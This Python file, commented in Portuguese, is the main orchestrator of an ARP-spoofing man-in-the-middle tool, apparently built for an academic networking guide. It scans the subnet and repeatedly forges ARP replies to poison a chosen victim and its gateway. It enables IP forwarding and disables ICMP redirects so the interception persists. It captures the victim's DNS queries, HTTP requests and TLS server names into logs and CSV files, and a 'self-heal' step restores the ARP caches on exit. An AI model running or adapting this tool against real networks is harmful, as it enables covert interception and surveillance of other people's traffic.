"""
app.py — Orquestrador do interceptador MITM.

Junta todos os módulos e implementa o modelo de concorrência da Figura 5 do guia:

   T1 Captura  --(fila thread-safe)-->  T2 Processamento --> AuditState
   T3 ARP spoofer (periódico)                     |
   T4 Painel (1s)                                 +--> Persistência (.log/.csv)

Além disso:
  * Abre o raw socket AF_PACKET (captura e injeção na camada de enlace);
  * Faz a descoberta ARP e a seleção de alvos (interativa ou via CLI);
  * Controla o IP forwarding do kernel (/proc/sys/net/ipv4/ip_forward);
  * Trata SIGINT/SIGTERM para a AUTO-CURA (restaura ARP e ip_forward).

Execução exige privilégios (raw socket + escrita em /proc). Ver README.
"""

import argparse
import os
import queue
import signal
import socket
import sys
import threading
import time

from . import arp, parser, dns, web, netutil
from .audit import AuditState
from .persist import Persistence
from .panel import run_panel_loop

IP_FORWARD_PATH = "/proc/sys/net/ipv4/ip_forward"


# =====================================================================
# Controle de IP forwarding
# =====================================================================
def read_ip_forward() -> str:
    try:
        with open(IP_FORWARD_PATH) as f:
            return f.read().strip()
    except Exception:
        return "?"


def set_ip_forward(on: bool):
    """Liga/desliga o encaminhamento de pacotes no kernel."""
    try:
        with open(IP_FORWARD_PATH, "w") as f:
            f.write("1\n" if on else "0\n")
        return True
    except Exception as e:
        print(f"[!] Falha ao escrever ip_forward: {e}", file=sys.stderr)
        return False


def disable_icmp_redirects():
    """
    Desativa o envio de ICMP Redirects. Sem isso, o kernel do atacante poderia
    avisar a Vítima para falar direto com o Gateway (desfazendo o MITM). É um
    passo padrão num ataque de encaminhamento transparente.
    """
    for path in ("/proc/sys/net/ipv4/conf/all/send_redirects",
                 "/proc/sys/net/ipv4/conf/default/send_redirects"):
        try:
            with open(path, "w") as f:
                f.write("0\n")
        except Exception:
            pass


# =====================================================================
# Interceptador
# =====================================================================
class Interceptor:
    def __init__(self, iface, victim_ip=None, gateway_ip=None,
                 interval=2.0, outdir=".", no_panel=False):
        self.iface = iface
        self.interval = interval
        self.outdir = outdir
        self.no_panel = no_panel

        info = netutil.iface_info(iface)
        self.my_mac = info["mac"]
        self.my_ip = info["ip"]
        self.netmask = info["netmask"]

        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.victim_mac = None
        self.gateway_mac = None

        self.state = AuditState()
        self.pkt_q = queue.Queue(maxsize=20000)
        self._running = True
        self._threads = []
        self._prev_forward = None
        self._healed = False
        self._stop_event = threading.Event()   # sinaliza parada do spoofer
        self._spoof_thread = None

        # Raw socket: captura E injeção na camada de enlace (AF_PACKET).
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                  socket.htons(0x0003))  # ETH_P_ALL
        self.sock.bind((iface, 0))

    # -----------------------------------------------------------------
    def stopped(self):
        return not self._running

    # ---------------- Descoberta e seleção de alvos ------------------
    def discover(self, duration=3.0):
        """Varredura ARP: lista hosts ativos (pares IP<->MAC)."""
        print(f"[*] Varredura ARP em {self.my_ip}/{self.netmask} "
              f"(interface {self.iface})...")
        scanner = arp.ArpScanner(self.sock, self.my_mac, self.my_ip)
        targets = list(netutil.hosts_in_subnet(self.my_ip, self.netmask))

        # Thread leitora rodando em paralelo ao envio dos requests.
        reader = threading.Thread(target=scanner.collect,
                                  kwargs={"duration": duration}, daemon=True)
        reader.start()
        scanner.send_requests(targets)
        reader.join()

        hosts = scanner.found
        print(f"[*] {len(hosts)} host(s) ativo(s) encontrado(s):")
        for i, (ip, mac) in enumerate(sorted(hosts.items())):
            print(f"    {i}) {ip:<16} {netutil.mac_to_str(mac)}")
        return hosts

    def resolve_mac(self, ip, hosts, tries=5):
        """Obtém o MAC de um IP (do scan ou via request dirigido)."""
        if ip in hosts:
            return hosts[ip]
        scanner = arp.ArpScanner(self.sock, self.my_mac, self.my_ip)
        for _ in range(tries):
            reader = threading.Thread(target=scanner.collect,
                                      kwargs={"duration": 1.0}, daemon=True)
            reader.start()
            scanner.send_requests([ip])
            reader.join()
            if ip in scanner.found:
                return scanner.found[ip]
        return None

    def select_targets(self, non_interactive=False):
        hosts = self.discover()
        if self.victim_ip and self.gateway_ip:
            # Alvos vindos da CLI (modo automático).
            self.victim_mac = self.resolve_mac(self.victim_ip, hosts)
            self.gateway_mac = self.resolve_mac(self.gateway_ip, hosts)
        elif non_interactive:
            raise SystemExit("[!] --victim e --gateway obrigatórios em modo "
                             "não-interativo")
        else:
            self.victim_ip = input("IP da VÍTIMA: ").strip()
            self.gateway_ip = input("IP do GATEWAY: ").strip()
            self.victim_mac = self.resolve_mac(self.victim_ip, hosts)
            self.gateway_mac = self.resolve_mac(self.gateway_ip, hosts)

        if not self.victim_mac or not self.gateway_mac:
            raise SystemExit(f"[!] Não resolvi os MACs "
                             f"(vítima={self.victim_mac}, "
                             f"gateway={self.gateway_mac}). "
                             f"Confira os IPs e a conectividade.")

        print(f"[+] Vítima  {self.victim_ip} -> "
              f"{netutil.mac_to_str(self.victim_mac)}")
        print(f"[+] Gateway {self.gateway_ip} -> "
              f"{netutil.mac_to_str(self.gateway_mac)}")
        self._update_arp_status("alvos selecionados")

    def _update_arp_status(self, state_txt):
        with self.state.lock:
            self.state.arp_status = {
                "iface": self.iface, "my_mac": self.my_mac,
                "victim_ip": self.victim_ip, "victim_mac": self.victim_mac,
                "gateway_ip": self.gateway_ip, "gateway_mac": self.gateway_mac,
                "state": state_txt, "ip_forward": read_ip_forward(),
            }

    # ----------------------- Threads ---------------------------------
    def capture_loop(self):
        """
        T1: só captura e enfileira — nunca bloqueia o processamento.

        Usamos recvfrom() para inspecionar o sll_pkttype do AF_PACKET e
        DESCARTAR os quadros de SAÍDA (PACKET_OUTGOING), ou seja, as cópias
        que o próprio atacante reinjeta ao reencaminhar. Assim cada pacote do
        fluxo da vítima é contabilizado uma única vez (sem duplicatas de
        entrada/saída).
        """
        while self._running:
            try:
                frame, addr = self.sock.recvfrom(65535)
            except OSError:
                break
            # addr = (ifname, proto, pkttype, hatype, hwaddr)
            if addr[2] == socket.PACKET_OUTGOING:
                continue
            try:
                self.pkt_q.put_nowait(frame)
            except queue.Full:
                pass  # descarta se a fila encher (preferível a travar)

    def process_loop(self):
        """T2: decodifica, filtra o fluxo da vítima e audita."""
        while self._running:
            try:
                frame = self.pkt_q.get(timeout=0.5)
            except queue.Empty:
                continue
            self._handle_frame(frame)

    def _involves_victim(self, ip_layer):
        return (ip_layer["src_ip"] == self.victim_ip or
                ip_layer["dst_ip"] == self.victim_ip)

    def _handle_frame(self, frame):
        pkt = parser.decode(frame)
        if pkt is None:
            return
        ip = pkt["ip"]
        # Filtro: apenas o fluxo da Vítima (requisito explícito).
        if not self._involves_victim(ip):
            return
        self.state.note_packet(len(frame))

        l4 = pkt["l4"]
        if pkt["l4_proto"] == "UDP" and l4:
            if l4["sport"] == 53 or l4["dport"] == 53:
                self._handle_dns(l4["payload"], ip)
        elif pkt["l4_proto"] == "TCP" and l4:
            payload = l4["payload"]
            if (l4["dport"] == 80 or l4["sport"] == 80) and payload:
                http = web.parse_http(payload)
                if http:
                    self.state.note_http(http, ip["src_ip"], ip["dst_ip"],
                                         len(frame))
                else:
                    self.state.add_flow_bytes(ip["dst_ip"], len(frame))
            elif (l4["dport"] == 443 or l4["sport"] == 443) and payload:
                if web.is_tls_client_hello(payload):
                    sni = web.extract_sni(payload)
                    self.state.note_tls(sni, ip["src_ip"], ip["dst_ip"],
                                        len(frame))
                else:
                    self.state.add_flow_bytes(ip["dst_ip"], len(frame))

    def _handle_dns(self, payload, ip):
        msg = dns.parse_dns(payload)
        if not msg or not msg["qname"]:
            return
        ips = [a[1] for a in msg["answers"]]
        self.state.learn_dns(msg["qname"], ips, ip["src_ip"], ip["dst_ip"])

    def spoof_loop(self):
        """T3: mantém o desvio vivo reenviando ARP Replies forjados.

        Usa Event.wait() em vez de sleep() para parar IMEDIATAMENTE quando a
        auto-cura é acionada — isso evita a condição de corrida em que uma
        última rajada de envenenamento chegaria DEPOIS das rajadas corretivas,
        re-envenenando o alvo.
        """
        while not self._stop_event.is_set():
            try:
                # Vítima acredita que o Gateway está no meu MAC.
                self.sock.send(arp.arp_poison(
                    self.victim_ip, self.victim_mac,
                    self.gateway_ip, self.my_mac))
                # Gateway acredita que a Vítima está no meu MAC.
                self.sock.send(arp.arp_poison(
                    self.gateway_ip, self.gateway_mac,
                    self.victim_ip, self.my_mac))
            except OSError:
                pass
            self._update_arp_status("ENVENENANDO (ativo)")
            self._stop_event.wait(self.interval)

    # ----------------------- Ciclo de vida ---------------------------
    def start(self):
        # 1) Salva e liga o IP forwarding (repasse transparente).
        self._prev_forward = read_ip_forward()
        set_ip_forward(True)
        disable_icmp_redirects()
        print(f"[*] ip_forward: {self._prev_forward} -> {read_ip_forward()}")

        # 2) Instala tratadores de sinal para a auto-cura.
        signal.signal(signal.SIGINT, self._on_signal)
        signal.signal(signal.SIGTERM, self._on_signal)

        # 3) Sobe as threads.
        self._spawn(self.capture_loop)
        self._spawn(self.process_loop)
        self._spoof_thread = threading.Thread(target=self.spoof_loop,
                                              daemon=True)
        self._spoof_thread.start()
        self._threads.append(self._spoof_thread)

        persist = Persistence(self.state, outdir=self.outdir)
        print(f"[*] Logs: {persist.log_path}")
        print(f"[*] CSV : {persist.csv_path}")
        self._spawn(persist.run_csv_loop, self.stopped)
        self._persist = persist

        if not self.no_panel:
            self._spawn(run_panel_loop, self.state, self.stopped)

        print("[+] MITM ativo. Ctrl+C para encerrar com auto-cura.")
        # Thread principal fica viva até receber sinal.
        try:
            while self._running:
                time.sleep(0.5)
        except KeyboardInterrupt:
            self._on_signal(signal.SIGINT, None)

    def _spawn(self, target, *args):
        t = threading.Thread(target=target, args=args, daemon=True)
        t.start()
        self._threads.append(t)

    def _on_signal(self, signum, frame):
        if self._healed:
            return
        self._healed = True
        print(f"\n[*] Sinal {signum} recebido — iniciando AUTO-CURA...")
        self._running = False
        # Para o spoofer e ESPERA ele terminar ANTES de restaurar, para que
        # nenhuma rajada de envenenamento chegue depois da correção.
        self._stop_event.set()
        if self._spoof_thread is not None:
            self._spoof_thread.join(timeout=self.interval + 1.0)
        self.heal()
        try:
            self._persist.close()
        except Exception:
            pass
        print("[+] Auto-cura concluída. ARP e ip_forward restaurados.")
        os._exit(0)

    def heal(self):
        """Rajadas corretivas de ARP legítimo + restauração do ip_forward."""
        self._update_arp_status("RESTAURANDO (auto-cura)")
        if self.victim_mac and self.gateway_mac:
            for _ in range(7):
                try:
                    # (1) Anúncios gratuitos em broadcast — forma mais robusta
                    #     de corrigir caches já estabelecidas (REACHABLE).
                    self.sock.send(arp.arp_announce(self.gateway_ip,
                                                    self.gateway_mac))
                    self.sock.send(arp.arp_announce(self.victim_ip,
                                                    self.victim_mac))
                    # (2) Replies unicast direcionados a cada alvo.
                    #     Diz à Vítima o MAC verdadeiro do Gateway.
                    self.sock.send(arp.arp_restore(
                        self.victim_ip, self.victim_mac,
                        self.gateway_ip, self.gateway_mac))
                    #     Diz ao Gateway o MAC verdadeiro da Vítima.
                    self.sock.send(arp.arp_restore(
                        self.gateway_ip, self.gateway_mac,
                        self.victim_ip, self.victim_mac))
                except OSError:
                    pass
                time.sleep(0.2)
        # Restaura o estado anterior do encaminhamento.
        if self._prev_forward in ("0", "1"):
            set_ip_forward(self._prev_forward == "1")
        print(f"[*] ip_forward restaurado para {read_ip_forward()}")


# =====================================================================
# CLI
# =====================================================================
def main(argv=None):
    ap = argparse.ArgumentParser(
        description="Interceptador MITM (ARP spoofing + auditoria de "
                    "metadados) — raw sockets nativos, sem Scapy/libpcap.")
    ap.add_argument("-i", "--iface", default=None,
                    help="interface de rede (default: rota default)")
    ap.add_argument("--victim", help="IP da vítima (modo automático)")
    ap.add_argument("--gateway", help="IP do gateway (modo automático)")
    ap.add_argument("--interval", type=float, default=2.0,
                    help="intervalo entre rajadas de ARP (s)")
    ap.add_argument("--outdir", default=".", help="diretório de saída")
    ap.add_argument("--non-interactive", action="store_true",
                    help="falha se os alvos não vierem por CLI")
    ap.add_argument("--no-panel", action="store_true",
                    help="desativa o painel (útil com log em arquivo)")
    ap.add_argument("--scan-only", action="store_true",
                    help="apenas varre a sub-rede e sai")
    args = ap.parse_args(argv)

    if os.geteuid() != 0:
        print("[!] Precisa de privilégios (root / CAP_NET_RAW+NET_ADMIN).",
              file=sys.stderr)

    iface = args.iface or netutil.default_iface()
    inter = Interceptor(iface, victim_ip=args.victim, gateway_ip=args.gateway,
                        interval=args.interval, outdir=args.outdir,
                        no_panel=args.no_panel)

    if args.scan_only:
        inter.discover()
        return

    inter.select_targets(non_interactive=args.non_interactive)
    inter.start()


if __name__ == "__main__":
    main()
